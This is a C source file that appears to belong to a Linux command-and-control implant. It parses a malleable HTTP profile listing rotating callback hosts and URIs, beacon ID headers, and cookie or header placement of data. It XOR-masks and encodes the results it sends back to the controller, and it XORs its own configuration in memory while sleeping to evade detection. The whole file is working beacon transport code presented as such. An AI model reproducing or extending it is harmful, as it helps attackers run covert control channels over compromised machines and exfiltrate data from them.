/* nax_linux/src/Transport/https_profile.c
 * Malleable profile parser + OutputConfig encode/decode pipeline.
 * Faithful port of PackerProfile.c (NaxDecodeProfile / NaxApplyProfile) and
 * HttpCodec.c (NaxEncodeData / NaxDecodeData / NaxBuildRequestHeaders).
 */

#ifndef NAX_HTTP_URI_GET
#  define NAX_HTTP_URI_GET  "/news/feed"
#endif
#ifndef NAX_HTTP_URI_POST
#  define NAX_HTTP_URI_POST "/api/submit"
#endif

#ifdef NAX_HTTPS_MODE

#include "nax_linux.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

/* ===== placement / format constants ===== */
#define NAX_FMT_RAW       0
#define NAX_FMT_BASE64    1
#define NAX_FMT_BASE64URL 2
#define NAX_FMT_HEX       3

#define NAX_PLACE_BODY      0
#define NAX_PLACE_HEADER    1
#define NAX_PLACE_COOKIE    2
#define NAX_PLACE_PARAMETER 3

/* ===== OutputConfig ===== */
typedef struct {
    uint8_t  format;
    uint8_t  mask;
    uint8_t  placement;
    char     name[128];
    char     prepend[512];  uint32_t prepend_len;
    char     append[512];   uint32_t append_len;
    char     empty_resp[512]; uint32_t empty_resp_len;
} OutputCfg;

/* ===== Profile state ===== */
typedef struct {
    char     beacon_id_hdr[128];
    char     user_agent[256];

    char     get_uris[8][128]; uint8_t get_uri_count;
    OutputCfg get_client_meta;
    char     get_client_hdrs[8][256]; uint8_t get_client_hdr_count;
    char     get_client_params[8][128]; uint8_t get_client_param_count;
    OutputCfg get_server_output;

    char     post_uris[8][128]; uint8_t post_uri_count;
    OutputCfg post_client_meta;
    OutputCfg post_client_output;
    char     post_client_hdrs[8][256]; uint8_t post_client_hdr_count;
    OutputCfg post_server_output;

    /* callback hosts from profile (for host rotation) */
    char     callback_hosts[8][256];
    uint16_t callback_ports[8];
    uint8_t  callback_count;
    uint8_t  rotation;  /* 0=sequential, 1=random */

    uint8_t  get_uri_idx;   /* current GET URI rotation index */
    uint8_t  post_uri_idx;  /* current POST URI rotation index */

    uint8_t  loaded;
} NaxHttpProfile;

static NaxHttpProfile g_profile = {0};

/* ===== wire read helpers (identical to PackerProfile.c) ===== */
static uint16_t r16(const uint8_t *d) {
    return (uint16_t)d[0] | ((uint16_t)d[1] << 8);
}
static int read_lpstr(const uint8_t *data, uint32_t len, uint32_t *off,
                       char *dst, uint32_t cap) {
    if (*off + 2 > len) return -1;
    uint16_t slen = r16(data + *off); *off += 2;
    if (*off + slen > len) return -1;
    uint32_t cpy = slen < cap - 1 ? slen : cap - 1;
    memcpy(dst, data + *off, cpy); dst[cpy] = '\0';
    *off += slen; return 0;
}
static int skip_lpstr(const uint8_t *data, uint32_t len, uint32_t *off) {
    if (*off + 2 > len) return -1;
    uint16_t slen = r16(data + *off); *off += 2 + slen;
    if (*off > len) return -1;
    return 0;
}
static int read_output_cfg(const uint8_t *data, uint32_t len, uint32_t *off,
                            OutputCfg *cfg) {
    if (*off + 3 > len) return -1;
    cfg->format    = data[(*off)++];
    cfg->mask      = data[(*off)++];
    cfg->placement = data[(*off)++];
    if (read_lpstr(data, len, off, cfg->name, sizeof(cfg->name)) < 0) return -1;
    uint32_t before;
    before = *off;
    if (read_lpstr(data, len, off, cfg->prepend, sizeof(cfg->prepend)) < 0) return -1;
    cfg->prepend_len = (before + 2 <= len) ? r16(data + before) : 0;
    if (cfg->prepend_len >= sizeof(cfg->prepend)) cfg->prepend_len = (uint32_t)sizeof(cfg->prepend)-1;
    before = *off;
    if (read_lpstr(data, len, off, cfg->append, sizeof(cfg->append)) < 0) return -1;
    cfg->append_len = (before + 2 <= len) ? r16(data + before) : 0;
    if (cfg->append_len >= sizeof(cfg->append)) cfg->append_len = (uint32_t)sizeof(cfg->append)-1;
    before = *off;
    if (read_lpstr(data, len, off, cfg->empty_resp, sizeof(cfg->empty_resp)) < 0) return -1;
    cfg->empty_resp_len = (before + 2 <= len) ? r16(data + before) : 0;
    return 0;
}

/* Forward declaration */
void nax_apply_profile(const uint8_t *data, uint32_t data_len);

/* Forward declaration — defined after nax_apply_profile, only in debug builds */
#ifdef NAX_DEBUG
static void nax_dbg_print_profile(const NaxHttpProfile *p, const char *event);
#endif

/* ===== Pending profile — deferred application ===== */

static uint8_t *g_pending_profile = NULL;
static uint32_t g_pending_profile_len = 0;

void nax_profile_set_pending(const uint8_t *data, uint32_t data_len) {
    if (g_pending_profile) free(g_pending_profile);
    g_pending_profile = (uint8_t *)malloc(data_len);
    if (g_pending_profile) {
        memcpy(g_pending_profile, data, data_len);
        g_pending_profile_len = data_len;
    }
}

int nax_profile_apply_pending(void) {
    if (!g_pending_profile) return 0;
    nax_apply_profile(g_pending_profile, g_pending_profile_len);
    /* Override the "initial" label with "RUNTIME UPDATE" for pending applies */
#ifdef NAX_DEBUG
    nax_dbg_print_profile(&g_profile, "RUNTIME UPDATE");
#endif
    free(g_pending_profile);
    g_pending_profile = NULL;
    g_pending_profile_len = 0;
    return 1; /* profile changed */
}

/* ===== nax_apply_profile (port of NaxDecodeProfile v2) ===== */
void nax_apply_profile(const uint8_t *data, uint32_t data_len)
{
    uint32_t off = 0; uint16_t i, count;
    NaxHttpProfile p = {0};
    if (data_len < 2) return;
    uint8_t version = data[off++];
    if (version != 0x02) return; /* only v2 */
    p.rotation = data[off++]; /* 0=sequential, 1=random */
    /* user_agent */
    if (read_lpstr(data, data_len, &off, p.user_agent, sizeof(p.user_agent)) < 0) return;
    /* beacon_id_hdr */
    if (read_lpstr(data, data_len, &off, p.beacon_id_hdr, sizeof(p.beacon_id_hdr)) < 0) return;
    /* callback hosts — parse "host:port" strings */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    p.callback_count = count < 8 ? (uint8_t)count : 8;
    for (i = 0; i < count; i++) {
        char cb[256] = {0};
        if (i < 8) { if (read_lpstr(data, data_len, &off, cb, 256) < 0) return; }
        else        { if (skip_lpstr(data, data_len, &off) < 0) return; }
        if (i < 8) {
            /* split "host:port" */
            char *colon = NULL;
            for (int ci = strlen(cb)-1; ci >= 0; ci--) {
                if (cb[ci] == ':') { colon = cb + ci; break; }
            }
            if (colon) {
                uint32_t hlen = (uint32_t)(colon - cb);
                if (hlen < 256) {
                    memcpy(p.callback_hosts[i], cb, hlen);
                    p.callback_hosts[i][hlen] = '\0';
                    p.callback_ports[i] = (uint16_t)atoi(colon + 1);
                }
            } else {
                strncpy(p.callback_hosts[i], cb, 255);
                p.callback_ports[i] = 443;
            }
        }
    }
    /* server error block (skip) */
    if (off + 2 > data_len) return;
    off += 2;
    if (skip_lpstr(data, data_len, &off) < 0) return;
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    for (i = 0; i < count; i++) if (skip_lpstr(data, data_len, &off) < 0) return;
    /* GET URIs */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    p.get_uri_count = count < 8 ? (uint8_t)count : 8;
    for (i = 0; i < count; i++) {
        if (i < 8) { if (read_lpstr(data, data_len, &off, p.get_uris[i], 128) < 0) return; }
        else        { if (skip_lpstr(data, data_len, &off) < 0) return; }
    }
    /* GET client_meta */
    if (read_output_cfg(data, data_len, &off, &p.get_client_meta) < 0) return;
    /* GET client headers */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    p.get_client_hdr_count = count < 8 ? (uint8_t)count : 8;
    for (i = 0; i < count; i++) {
        if (i < 8) { if (read_lpstr(data, data_len, &off, p.get_client_hdrs[i], 256) < 0) return; }
        else        { if (skip_lpstr(data, data_len, &off) < 0) return; }
    }
    /* GET client params */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    p.get_client_param_count = count < 8 ? (uint8_t)count : 8;
    for (i = 0; i < count; i++) {
        if (i < 8) { if (read_lpstr(data, data_len, &off, p.get_client_params[i], 128) < 0) return; }
        else        { if (skip_lpstr(data, data_len, &off) < 0) return; }
    }
    /* GET server output */
    if (read_output_cfg(data, data_len, &off, &p.get_server_output) < 0) return;
    /* GET server headers (skip) */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    for (i = 0; i < count; i++) if (skip_lpstr(data, data_len, &off) < 0) return;
    /* POST URIs */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    p.post_uri_count = count < 8 ? (uint8_t)count : 8;
    for (i = 0; i < count; i++) {
        if (i < 8) { if (read_lpstr(data, data_len, &off, p.post_uris[i], 128) < 0) return; }
        else        { if (skip_lpstr(data, data_len, &off) < 0) return; }
    }
    /* POST client_meta */
    if (read_output_cfg(data, data_len, &off, &p.post_client_meta) < 0) return;
    /* POST client_output */
    if (read_output_cfg(data, data_len, &off, &p.post_client_output) < 0) return;
    /* POST client headers */
    if (off + 2 > data_len) return;
    count = r16(data + off); off += 2;
    p.post_client_hdr_count = count < 8 ? (uint8_t)count : 8;
    for (i = 0; i < count; i++) {
        if (i < 8) { if (read_lpstr(data, data_len, &off, p.post_client_hdrs[i], 256) < 0) return; }
        else        { if (skip_lpstr(data, data_len, &off) < 0) return; }
    }
    /* POST server output */
    if (read_output_cfg(data, data_len, &off, &p.post_server_output) < 0) return;
    p.loaded = 1;
    g_profile = p;
}


int         nax_profile_loaded(void)    { return g_profile.loaded; }
const char *nax_profile_beacon_hdr(void){ return g_profile.loaded ? g_profile.beacon_id_hdr : "X-Beacon-Id"; }

void nax_dbg_print_profile_pub(void) {
#ifdef NAX_DEBUG
    nax_dbg_print_profile(&g_profile, "INITIAL");
#endif
}

/* ===== Debug profile dump — prints full profile info, called once per apply ===== */
#ifdef NAX_DEBUG
#include <stdio.h>
static void nax_dbg_print_profile(const NaxHttpProfile *p, const char *event)
{
    static const char *fmt_name[] = { "raw", "base64", "base64url", "hex" };
    static const char *place_name[] = { "body", "header", "cookie", "parameter" };
    fprintf(stderr, "[NAX-OK  ] ======== PROFILE %s ========\n", event);
    fprintf(stderr, "[NAX-OK  ]   user_agent      : %s\n", p->user_agent);
    fprintf(stderr, "[NAX-OK  ]   beacon_id_hdr   : %s\n", p->beacon_id_hdr);
    fprintf(stderr, "[NAX-OK  ]   rotation        : %s\n", p->rotation ? "random" : "sequential");
    fprintf(stderr, "[NAX-OK  ]   callbacks       : %u host(s)\n", p->callback_count);
    for (int i = 0; i < p->callback_count; i++)
        fprintf(stderr, "[NAX-OK  ]     [%d] %s:%u\n", i, p->callback_hosts[i], p->callback_ports[i]);
    fprintf(stderr, "[NAX-OK  ]   GET URIs        : %u\n", p->get_uri_count);
    for (int i = 0; i < p->get_uri_count; i++)
        fprintf(stderr, "[NAX-OK  ]     [%d] %s\n", i, p->get_uris[i]);
    fprintf(stderr, "[NAX-OK  ]   GET client_meta : fmt=%-9s mask=%d placement=%s name=%s\n",
        fmt_name[p->get_client_meta.format & 3],
        p->get_client_meta.mask,
        place_name[p->get_client_meta.placement & 3],
        p->get_client_meta.name);
    fprintf(stderr, "[NAX-OK  ]   GET srv_output  : fmt=%-9s mask=%d placement=%s\n",
        fmt_name[p->get_server_output.format & 3],
        p->get_server_output.mask,
        place_name[p->get_server_output.placement & 3]);
    fprintf(stderr, "[NAX-OK  ]   POST URIs       : %u\n", p->post_uri_count);
    for (int i = 0; i < p->post_uri_count; i++)
        fprintf(stderr, "[NAX-OK  ]     [%d] %s\n", i, p->post_uris[i]);
    fprintf(stderr, "[NAX-OK  ]   POST client_meta: fmt=%-9s mask=%d placement=%s name=%s\n",
        fmt_name[p->post_client_meta.format & 3],
        p->post_client_meta.mask,
        place_name[p->post_client_meta.placement & 3],
        p->post_client_meta.name);
    fprintf(stderr, "[NAX-OK  ]   POST cli_output : fmt=%-9s mask=%d placement=%s\n",
        fmt_name[p->post_client_output.format & 3],
        p->post_client_output.mask,
        place_name[p->post_client_output.placement & 3]);
    fprintf(stderr, "[NAX-OK  ]   POST srv_output : fmt=%-9s mask=%d\n",
        fmt_name[p->post_server_output.format & 3],
        p->post_server_output.mask);
    fprintf(stderr, "[NAX-OK  ] ======== END PROFILE ========\n");
}
#else
#  define nax_dbg_print_profile(p, event) do {} while(0)
#endif
const char *nax_profile_get_uri(void)   { return (g_profile.loaded && g_profile.get_uri_count > 0) ? g_profile.get_uris[g_profile.get_uri_idx] : NAX_HTTP_URI_GET; }
const char *nax_profile_post_uri(void)  { return (g_profile.loaded && g_profile.post_uri_count > 0) ? g_profile.post_uris[0] : NAX_HTTP_URI_POST; }
uint8_t     nax_profile_rotation(void)  { return g_profile.loaded ? g_profile.rotation : 0; }
uint8_t     nax_profile_callbacks_count(void) { return g_profile.loaded ? g_profile.callback_count : 0; }

int nax_profile_callback_host(uint8_t idx, char *host, uint16_t *port) {
    if (!g_profile.loaded || idx >= g_profile.callback_count) return -1;
    strncpy(host, g_profile.callback_hosts[idx], 255);
    *port = g_profile.callback_ports[idx];
    return 0;
}

const char *nax_profile_get_uri_rotate(void) {
    if (!g_profile.loaded || g_profile.get_uri_count == 0) return NAX_HTTP_URI_GET;
    uint8_t idx = g_profile.get_uri_idx;
    g_profile.get_uri_idx = (g_profile.rotation == 1)
        ? (uint8_t)(rand() % g_profile.get_uri_count)
        : (uint8_t)((idx + 1) % g_profile.get_uri_count);
    return g_profile.get_uris[idx];
}

const char *nax_profile_post_uri_rotate(void) {
    if (!g_profile.loaded || g_profile.post_uri_count == 0) return NAX_HTTP_URI_POST;
    uint8_t idx = g_profile.post_uri_idx;
    g_profile.post_uri_idx = (g_profile.rotation == 1)
        ? (uint8_t)(rand() % g_profile.post_uri_count)
        : (uint8_t)((idx + 1) % g_profile.post_uri_count);
    return g_profile.post_uris[idx];
}

/* Returns 1 if data matches the EmptyResp of the GET server output.
 * When the server has no tasks it sends EmptyResp verbatim (not AES-CBC).
 * The beacon must detect this and treat it as NO_TASKS instead of trying
 * to decrypt it */
int nax_is_empty_resp(const uint8_t *data, uint32_t data_len)
{
    if (!g_profile.loaded) return 0;
    uint32_t er_len = g_profile.get_server_output.empty_resp_len;
    if (er_len == 0 || er_len != data_len) return 0;
    return memcmp(data, g_profile.get_server_output.empty_resp, er_len) == 0;
}

/* ===== base64 encode (no line wraps) ===== */
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char B64U[]= "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
static uint32_t b64_enc(const uint8_t *in, uint32_t in_len, char *out, uint32_t cap, int url_safe)
{
    const char *t = url_safe ? B64U : B64;
    uint32_t i = 0, o = 0;
    while (i < in_len && o + 5 < cap) {
        uint32_t n_bytes = 1;
        uint32_t v = (uint32_t)in[i++] << 16;
        if (i < in_len) { v |= (uint32_t)in[i++] << 8; n_bytes++; }
        if (i < in_len) { v |= (uint32_t)in[i++];       n_bytes++; }
        out[o++] = t[(v>>18)&0x3F];
        out[o++] = t[(v>>12)&0x3F];
        out[o++] = (n_bytes >= 2) ? t[(v>>6)&0x3F] : (url_safe ? 0 : '=');
        out[o++] = (n_bytes >= 3) ? t[v&0x3F]      : (url_safe ? 0 : '=');
    }
    /* url_safe: trim trailing nulls (no padding per RFC 7515) */
    if (url_safe) { while (o > 0 && out[o-1] == 0) o--; }
    out[o] = '\0';
    return o;
}

/* base64 decode */
static uint32_t b64_dec(const char *in, uint32_t in_len, uint8_t *out, uint32_t cap)
{
    static const signed char dec[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,62,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,63,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    };
    uint32_t o = 0; uint32_t acc = 0; int bits = 0;
    for (uint32_t i = 0; i < in_len && o < cap; i++) {
        int v = dec[(uint8_t)in[i]];
        if (v < 0) continue;
        acc = (acc << 6) | (uint32_t)v; bits += 6;
        if (bits >= 8) { bits -= 8; out[o++] = (uint8_t)(acc >> bits); }
    }
    return o;
}

/* hex encode */
static uint32_t hex_enc(const uint8_t *in, uint32_t in_len, char *out, uint32_t cap)
{
    static const char hx[] = "0123456789abcdef";
    uint32_t o = 0;
    for (uint32_t i = 0; i < in_len && o + 2 < cap; i++) {
        out[o++] = hx[(in[i]>>4)&0xF]; out[o++] = hx[in[i]&0xF];
    }
    out[o] = '\0'; return o;
}

/* hex decode */
static int hex_nibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}
static uint32_t hex_dec(const char *in, uint32_t in_len, uint8_t *out, uint32_t cap)
{
    uint32_t o = 0;
    for (uint32_t i = 0; i + 1 < in_len && o < cap; i += 2) {
        int hi = hex_nibble(in[i]), lo = hex_nibble(in[i+1]);
        if (hi < 0 || lo < 0) continue;
        out[o++] = (uint8_t)((hi << 4) | lo);
    }
    return o;
}

/* ===== NaxEncodeData port ===== */
/* XOR mask: port of NaxXorMask from HttpCodec.c.
 * output = [key(4)] || [data XOR key], returns out_len. */
static uint32_t xor_mask(const uint8_t *src, uint32_t src_len,
                          uint8_t *dst, uint32_t dst_cap)
{
    if (dst_cap < 4 + src_len) return 0;
    FILE *f = fopen("/dev/urandom", "rb");
    if (!f) return 0;
    fread(dst, 1, 4, f);
    fclose(f);
    for (uint32_t i = 0; i < src_len; i++)
        dst[4 + i] = src[i] ^ dst[i % 4];
    return 4 + src_len;
}

static uint32_t encode_data(const OutputCfg *cfg, const uint8_t *src, uint32_t src_len,
                              char *dst, uint32_t dst_cap)
{
    /* XOR mask — port of NaxXorMask (HttpCodec.c): prepend 4-byte random key, XOR data */
    const uint8_t *input = src;
    uint32_t input_len = src_len;
    uint8_t *masked = NULL;

    if (cfg->mask && src_len > 0) {
        masked = (uint8_t *)malloc(4 + src_len);
        if (!masked) return 0;
        uint32_t mlen = xor_mask(src, src_len, masked, 4 + src_len);
        if (mlen == 0) { free(masked); return 0; }
        input = masked;
        input_len = mlen;
    }

    /* encode — dynamic buffer sized for worst case (hex = 2x input) */
    uint32_t enc_cap_dyn = input_len * 2 + 64;
    if (enc_cap_dyn < 8192) enc_cap_dyn = 8192;
    char *enc_buf = (char *)malloc(enc_cap_dyn);
    if (!enc_buf) { if (masked) free(masked); return 0; }
    uint32_t enc_len = 0;
    switch (cfg->format) {
    case NAX_FMT_BASE64:
        enc_len = b64_enc(input, input_len, enc_buf, enc_cap_dyn, 0);
        break;
    case NAX_FMT_BASE64URL:
        enc_len = b64_enc(input, input_len, enc_buf, enc_cap_dyn, 1);
        break;
    case NAX_FMT_HEX:
        enc_len = hex_enc(input, input_len, enc_buf, enc_cap_dyn);
        break;
    default: /* raw */
        if (input_len >= enc_cap_dyn) { free(enc_buf); if (masked) free(masked); return 0; }
        memcpy(enc_buf, input, input_len); enc_len = input_len;
        break;
    }
    if (masked) free(masked);

    /* prepend + encoded + append */
    uint32_t total = cfg->prepend_len + enc_len + cfg->append_len;
    if (total >= dst_cap) { free(enc_buf); return 0; }
    uint32_t off = 0;
    if (cfg->prepend_len > 0) { memcpy(dst + off, cfg->prepend, cfg->prepend_len); off += cfg->prepend_len; }
    memcpy(dst + off, enc_buf, enc_len); off += enc_len;
    if (cfg->append_len  > 0) { memcpy(dst + off, cfg->append,  cfg->append_len);  off += cfg->append_len;  }
    dst[off] = '\0';
    free(enc_buf);
    return off;
}

/* ===== NaxDecodeData port ===== */
/* XOR unmask: port of NaxXorUnmask from Ldr.c.
 * src = [key(4)][masked_data] -> dst = unmasked_data, returns data_len. */
static uint32_t xor_unmask(const uint8_t *src, uint32_t src_len,
                             uint8_t *dst, uint32_t dst_cap)
{
    if (src_len < 4) return 0;
    uint32_t data_len = src_len - 4;
    if (dst_cap < data_len) return 0;
    for (uint32_t i = 0; i < data_len; i++)
        dst[i] = src[4 + i] ^ src[i % 4];
    return data_len;
}

static uint32_t decode_data(const OutputCfg *cfg, const uint8_t *src, uint32_t src_len,
                              uint8_t *dst, uint32_t dst_cap)
{
    const uint8_t *data = src; uint32_t data_len = src_len;
    if (data_len >= cfg->prepend_len + cfg->append_len) {
        data     += cfg->prepend_len;
        data_len -= cfg->prepend_len + cfg->append_len;
    }

    /* Decode format — into dst (used as temp buffer when mask follows) */
    uint8_t *dec_buf = dst;
    uint32_t dec_cap = dst_cap;
    uint8_t *tmp = NULL;

    /* If mask is set, we need a temp buffer for the decoded bytes
     * before unmask writes the final result into dst */
    if (cfg->mask && data_len > 0) {
        tmp = (uint8_t *)malloc(data_len + 64);
        if (!tmp) return 0;
        dec_buf = tmp;
        dec_cap = data_len + 64;
    }

    uint32_t dec_len = 0;
    switch (cfg->format) {
    case NAX_FMT_BASE64:
    case NAX_FMT_BASE64URL:
        dec_len = b64_dec((const char *)data, data_len, dec_buf, dec_cap);
        break;
    case NAX_FMT_HEX:
        dec_len = hex_dec((const char *)data, data_len, dec_buf, dec_cap);
        break;
    default:
        if (data_len > dec_cap) { if (tmp) free(tmp); return 0; }
        memcpy(dec_buf, data, data_len); dec_len = data_len;
        break;
    }

    /* XOR unmask: port of NaxXorUnmask (Ldr.c).
     * dec_buf = [key(4)][masked_data] -> dst = unmasked_data */
    if (cfg->mask && dec_len > 4) {
        uint32_t r = xor_unmask(dec_buf, dec_len, dst, dst_cap);
        if (tmp) free(tmp);
        return r;
    }

    if (tmp) {
        /* No mask or too short — copy tmp to dst */
        if (dec_len > dst_cap) { free(tmp); return 0; }
        memcpy(dst, dec_buf, dec_len);
        free(tmp);
    }
    return dec_len;
}

/* ===== Public API for https.c ===== */

/* Encode body per GetClientMeta (is_get=1) or PostClientOutput (is_get=0) */
/* ===== Encode functions ===== */

/* Encode GET metadata (encrypted heartbeat) → uses GetClientMeta config.
 * Result goes into cookie/header/parameter per placement. */
uint32_t nax_encode_get_meta(const uint8_t *body, uint32_t body_len,
                              char *out_buf, uint32_t out_cap)
{
    if (!g_profile.loaded)
        return b64_enc(body, body_len, out_buf, out_cap, 0);
    return encode_data(&g_profile.get_client_meta, body, body_len, out_buf, out_cap);
}

/* Encode POST metadata (session ID) → uses PostClientMeta config.
 * Result goes into header/cookie/parameter per placement. */
uint32_t nax_encode_post_meta(const uint8_t *body, uint32_t body_len,
                               char *out_buf, uint32_t out_cap)
{
    if (!g_profile.loaded) {
        if (body_len >= out_cap) return 0;
        memcpy(out_buf, body, body_len);
        out_buf[body_len] = '\0';
        return body_len;
    }
    return encode_data(&g_profile.post_client_meta, body, body_len, out_buf, out_cap);
}

/* Encode POST body (encrypted result) → uses PostClientOutput config.
 * Result goes into body with prepend/append. */
uint32_t nax_encode_post_output(const uint8_t *body, uint32_t body_len,
                                 char *out_buf, uint32_t out_cap)
{
    if (!g_profile.loaded)
        return b64_enc(body, body_len, out_buf, out_cap, 0);
    return encode_data(&g_profile.post_client_output, body, body_len, out_buf, out_cap);
}

/* Build HTTP request headers string .
 * Includes: beacon_id_hdr, cookie/header placement of meta, custom headers,
 * X-NaX-Public, Content-Type for POST. */
uint32_t nax_build_request_headers(const char *sid,
                                    const char *meta_enc, uint32_t meta_enc_len,
                                    int is_get,
                                    char *hdr_buf, uint32_t hdr_cap)
{
    uint32_t off = 0;
    const char *bid_hdr = nax_profile_beacon_hdr();

    /* Beacon ID header */
    off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off,
        "%s: %s\r\n", bid_hdr, sid);
    /* Debug: show meta_cfg */
    {
        const OutputCfg *dbg_cfg = is_get ? &g_profile.get_client_meta
                                           : &g_profile.post_client_meta;
        (void)dbg_cfg;
    }

    if (g_profile.loaded && meta_enc && meta_enc_len > 0) {
        const OutputCfg *meta_cfg = is_get ? &g_profile.get_client_meta
                                            : &g_profile.post_client_meta;
        switch (meta_cfg->placement) {
        case NAX_PLACE_COOKIE:
            off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off,
                "Cookie: %s=%s\r\n", meta_cfg->name, meta_enc);
            break;
        case NAX_PLACE_HEADER:
            off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off,
                "%s: %s\r\n", meta_cfg->name, meta_enc);
            break;
        default:
            break; /* BODY/PARAM handled outside headers */
        }
    }

    /* Content-Type for POST when no custom headers */
    if (!is_get) {
        int has_hdrs = g_profile.loaded ? g_profile.post_client_hdr_count : 0;
        if (!has_hdrs) {
            off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off,
                "Content-Type: application/octet-stream\r\n");
        }
    }

    /* Custom profile headers */
    if (g_profile.loaded) {
        int hdr_count = is_get ? g_profile.get_client_hdr_count
                                : g_profile.post_client_hdr_count;
        const char (*hdrs)[256] = is_get ? g_profile.get_client_hdrs
                                          : g_profile.post_client_hdrs;
        for (int h = 0; h < hdr_count; h++)
            off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off,
                "%s\r\n", hdrs[h]);
    }

    /* X-NaX-Public: 1 */
    off += (uint32_t)snprintf(hdr_buf + off, hdr_cap - off, "X-NaX-Public: 1\r\n");

    return off;
}

/* Decode server output (strip prepend/append, decode format).
 * Returns decoded length, 0 if no transform needed (caller uses raw). */
uint32_t nax_decode_server_output(const uint8_t *enc, uint32_t enc_len,
                                   int is_get,
                                   uint8_t *out, uint32_t out_cap)
{
    if (!g_profile.loaded) return 0; /* no transform */
    const OutputCfg *cfg = is_get ? &g_profile.get_server_output
                                   : &g_profile.post_server_output;
    /* Only decode if there's something to do */
    if (cfg->format == NAX_FMT_RAW && !cfg->mask &&
        cfg->prepend_len == 0 && cfg->append_len == 0)
        return 0;
    return decode_data(cfg, enc, enc_len, out, out_cap);
}

/* ── Sleep obfuscation ─────────────────────────────────────────────────────
 * XOR g_profile in-place with the given key during agent sleep.
 * Called from https.c with a per-cycle random key stored in a memfd.
 * key_len must be at least sizeof(NaxHttpProfile). */
void nax_profile_xor(const uint8_t *key, uint32_t key_len)
{
    volatile uint8_t *p = (volatile uint8_t *)&g_profile;
    uint32_t sz = (uint32_t)sizeof(NaxHttpProfile);
    for (uint32_t i = 0; i < sz; i++)
        p[i] ^= key[i % key_len];
}

#endif /* NAX_HTTPS_MODE */
